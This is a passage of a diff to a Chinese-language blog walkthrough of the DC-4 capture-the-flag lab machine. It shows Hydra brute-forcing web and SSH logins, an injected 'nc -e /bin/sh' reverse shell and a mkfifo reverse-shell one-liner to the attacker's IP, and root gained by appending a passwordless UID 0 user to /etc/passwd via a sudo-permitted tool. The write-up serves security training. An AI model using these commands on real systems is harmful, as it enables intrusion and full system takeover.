+<pre><code class="bash">root@Knlvre:/usr/share/wordlists# hydra -l admin -P /usr/share/wordlists/rockyou.txt 192.168.43.193 http-post-form &quot;/login.php:username=^USER^&amp;password=^PASS^:S=logout&quot;
 Hydra v9.0 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.
 
 Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2019-09-23 14:38:45
@@ -730,21 +775,24 @@ Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2019-09-23 14:38:
 [80][http-post-form] host: 192.168.43.193   login: admin   password: happy
 1 of 1 target successfully completed, 1 valid password found
 Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2019-09-23 14:39:01
-</code></pre><p>获得<code>用户名admin - 密码happy</code>。登录之后可以进行3个操作：<code>ls -l、du -h、df -h</code>，可能存在命令执行漏洞</p>
+</code></pre>
+<p>获得<code>用户名admin - 密码happy</code>。登录之后可以进行3个操作：<code>ls -l、du -h、df -h</code>，可能存在命令执行漏洞</p>
 <p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/DC/4-2.png" alt="4-2"></p>
 <p>抓包，发现可以直接修改要执行的命令并直接执行</p>
 <p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/DC/4-3.png" alt="4-3"></p>
 <p>现在直接通过<code>nc</code>命令反弹一个shell</p>
-<pre><code>radio=nc -e /bin/sh 192.168.43.84 3737&amp;submit=Run
-</code></pre><p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/DC/4-4.png" alt="4-4"></p>
+<pre><code class="code">radio=nc -e /bin/sh 192.168.43.84 3737&amp;submit=Run
+</code></pre>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/DC/4-4.png" alt="4-4"></p>
 <p>如果不支持<code>-e</code>参数，也可以创建远程shell，命令与DC3中一样，但是此处好像不行，到<code>2&gt;</code>处就断了，不再去看</p>
 <p>意义：创建了一个fifo文件，然后使用管道命令把这个fifo文件内容定向到shell 2&gt;&amp;1中。是用来重定向标准错误输出和标准输出，然后管道到netcat 运行的端口3737上。至此，我们已经把netcat的输出重定向到fifo文件中。</p>
 <p>说明：从网络收到的输入写到fifo文件中，cat 命令读取fifo文件并且其内容发送给sh命令，sh命令进程受到输入并把它写回到netcat。netcat 通过网络发送输出到client</p>
 <p>至于为什么会成功是因为管道使命令平行执行，fifo文件用来替代正常文件，因为fifo使读取等待而如果是一个普通文件，cat命令会尽快结束并开始读取空文件。</p>
-<pre><code>rm /tmp/f;mkfifo /tmp/f;cat /tmp/f | /bin/sh 2&gt;&amp;1 | nc 192.168.43.84 3737 &gt; /tmp/f
-</code></pre><p>回归正题，拿到shell之后，切换到<code>/home</code>目录下，发现有3个用户<code>charles,jim,sam</code>，只有<code>jim</code>目录下有东西，在<code>/home/jim/backups/</code>目录下发现密码文件<code>old-passwords.bak</code>，里面存放着很多密码，除此之外没有其他有用信息。回到上级目录，发现<code>mbox</code>其他人没有权限读，十分可疑。那应该就是要获取<code>jim</code>的密码，ssh登录然后查看了</p>
+<pre><code class="code">rm /tmp/f;mkfifo /tmp/f;cat /tmp/f | /bin/sh 2&gt;&amp;1 | nc 192.168.43.84 3737 &gt; /tmp/f
+</code></pre>
+<p>回归正题，拿到shell之后，切换到<code>/home</code>目录下，发现有3个用户<code>charles,jim,sam</code>，只有<code>jim</code>目录下有东西，在<code>/home/jim/backups/</code>目录下发现密码文件<code>old-passwords.bak</code>，里面存放着很多密码，除此之外没有其他有用信息。回到上级目录，发现<code>mbox</code>其他人没有权限读，十分可疑。那应该就是要获取<code>jim</code>的密码，ssh登录然后查看了</p>
 <p>将密码文件复制下来写入<code>dc4_passwords.txt</code>，前面扫描端口发现还开放22号端口，那么接下来就用<code>hydra</code>爆破<code>ssh</code></p>
-<pre><code>root@Knlvre:~# hydra -l jim -P dc4_passwords.txt ssh://192.168.43.193
+<pre><code class="bash">root@Knlvre:~# hydra -l jim -P dc4_passwords.txt ssh://192.168.43.193
 Hydra v9.0 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.
 
 Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2019-09-23 16:10:00
@@ -759,8 +807,9 @@ Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2019-09-23 16:10:
 [ERROR] 1 target did not resolve or could not be connected
 [ERROR] 0 targets did not complete
 Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2019-09-23 16:11:48
-</code></pre><p>ssh登录成功，查看mbox</p>
-<pre><code>root@Knlvre:~# ssh jim@192.168.43.193
+</code></pre>
+<p>ssh登录成功，查看mbox</p>
+<pre><code class="bash">root@Knlvre:~# ssh jim@192.168.43.193
 The authenticity of host &#39;192.168.43.193 (192.168.43.193)&#39; can&#39;t be established.
 ECDSA key fingerprint is SHA256:vtcgdCXO4d3KmnjiIIkH1Een5F1AiSx3qp0ABgwdvww.
 Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
@@ -792,8 +841,9 @@ Date: Sat, 06 Apr 2019 20:20:04 +1000
 Status: RO
 
 This is a test.
-</code></pre><p>切换到<code>/var/mail</code>下获得<code>Charles</code>的密码</p>
-<pre><code>jim@dc-4:~$ cd /var/mail
+</code></pre>
+<p>切换到<code>/var/mail</code>下获得<code>Charles</code>的密码</p>
+<pre><code class="bash">jim@dc-4:~$ cd /var/mail
 jim@dc-4:/var/mail$ ls
 jim
 jim@dc-4:/var/mail$ cat jim
@@ -823,8 +873,9 @@ Password is:  ^xHhA&amp;hvim0y
 
 See ya,
 Charles
-</code></pre><p>登录<code>charles</code>，尝试命令<code>sudo -l</code>时却提示用<code>teehee</code>提权</p>
-<pre><code>jim@dc-4:/var/mail$ su charles
+</code></pre>
+<p>登录<code>charles</code>，尝试命令<code>sudo -l</code>时却提示用<code>teehee</code>提权</p>
+<pre><code class="bash">jim@dc-4:/var/mail$ su charles
 Password: 
 charles@dc-4:/var/mail$ sudo -l
 Matching Defaults entries for charles on dc-4:
@@ -832,12 +883,13 @@ Matching Defaults entries for charles on dc-4:
 
 User charles may run the following commands on dc-4:
     (root) NOPASSWD: /usr/bin/teehee
-</code></pre><p>参考别人的文章， 有两种方法：</p>
+</code></pre>
+<p>参考别人的文章， 有两种方法：</p>
 <p>方法一：</p>
 <p>①<code>crontab</code>：是一个计划表，可以定时地执行命令。而需要命令立即执行只要设置为五个<code>*</code>就可以：<code>* * * * *</code></p>
 <p>②<code>teehee</code>：是一个命令，但暂时未弄清楚功能</p>
 <p>首先我们进行测试，创建文件666，改变他的权限</p>
-<pre><code># sudo teehee /etc/crontab
+<pre><code class="bash"># sudo teehee /etc/crontab
 # * * * * * root chmod 4777 /home/charles/666
 
 charles@dc-4:~$ touch 666
@@ -849,8 +901,9 @@ charles@dc-4:~$ sudo teehee /etc/crontab
 ^C
 charles@dc-4:~$ ls -la 666
 -rwsrwxrwx 1 charles charles 0 Sep 23 21:01 666
-</code></pre><p>现在可以去改变<code>/bin/sh</code>的权限</p>
-<pre><code>charles@dc-4:~$ ls -la /bin/sh
+</code></pre>
+<p>现在可以去改变<code>/bin/sh</code>的权限</p>
+<pre><code class="bash">charles@dc-4:~$ ls -la /bin/sh
 lrwxrwxrwx 1 root root 4 Jan 24  2017 /bin/sh -&gt; dash
 charles@dc-4:~$ ls -la /bin/dash
 -rwxrwxrwx 1 root root 124492 Jan 24  2017 /bin/dash
@@ -860,8 +913,9 @@ charles@dc-4:~$ sudo teehee /etc/crontab
 ^C
 charles@dc-4:~$ ls -la /bin/dash
 -rwsrwxrwx 1 root root 124492 Jan 24  2017 /bin/dash
-</code></pre><p>可以看到<code>/bin/dash</code>权限改变成功，接下来直接使用<code>/bin/sh</code>，找flag并读取</p>
-<pre><code>charles@dc-4:~$ /bin/sh
+</code></pre>
+<p>可以看到<code>/bin/dash</code>权限改变成功，接下来直接使用<code>/bin/sh</code>，找flag并读取</p>
+<pre><code class="bash">charles@dc-4:~$ /bin/sh
 # find / -name &quot;*flag*&quot;
 ....
 /sys/module/scsi_mod/parameters/default_dev_flags
@@ -890,10 +944,11 @@ challenges.
 
 If you enjoyed this CTF, send me a tweet via @DCAU7.
 
-</code></pre><p>方法二：</p>
+</code></pre>
+<p>方法二：</p>
 <p><code>teehee -a</code>参数可以不覆盖地向指定文件添加内容，通过这个向<code>passwd</code>中添加一个用户</p>
 <p>Ps：查看passwd，root用户的登录shell为<code>/bin/bash</code></p>
-<pre><code>charles@dc-4:~$ tail -3 /etc/passwd
+<pre><code class="bash">charles@dc-4:~$ tail -3 /etc/passwd
 jim:x:1002:1002:Jim,,,:/home/jim:/bin/bash
 sam:x:1003:1003:Sam,,,:/home/sam:/bin/bash
 Debian-exim:x:108:112::/var/spool/exim4:/bin/false
@@ -903,12 +958,14 @@ charles@dc-4:~$ tail -3 /etc/passwd
 sam:x:1003:1003:Sam,,,:/home/sam:/bin/bash
 Debian-exim:x:108:112::/var/spool/exim4:/bin/false
 Knlvre_hack::0:0:::/bin/bash
-</code></pre><p>参数解释</p>
-<pre><code>#如：admin:x:0:0::/home/admin:/bin/bash
+</code></pre>
+<p>参数解释</p>
+<pre><code class="code">#如：admin:x:0:0::/home/admin:/bin/bash
 
 #[用户名]：[密码]：[UID]：[GID]：[身份描述]：[主目录]：[登录shell]
-</code></pre><p>添加成功之后，由于没有设置密码，所以直接登录，直接是root权限</p>
-<pre><code>charles@dc-4:~$ su Knlvre_hack
+</code></pre>
+<p>添加成功之后，由于没有设置密码，所以直接登录，直接是root权限</p>
+<pre><code class="bash">charles@dc-4:~$ su Knlvre_hack
 root@dc-4:/home/charles# id
 uid=0(root) gid=0(root) groups=0(root)
 root@dc-4:/home/charles# cat /root/flag.txt
@@ -932,7 +989,8 @@ who have provided feedback, and who have taken time to complete these little
 challenges.
 
 If you enjoyed this CTF, send me a tweet via @DCAU7.
-</code></pre><hr>
+</code></pre>
+<hr>
 <p><strong>Reference</strong></p>
 <p><a href="https://blog.csdn.net/auuuuuuuu/article/details/97832336" target="_blank" rel="noopener">https://blog.csdn.net/auuuuuuuu/article/details/97832336</a></p>
 <p><a href="https://blog.51cto.com/5437315/2420079" target="_blank" rel="noopener">https://blog.51cto.com/5437315/2420079</a></p>
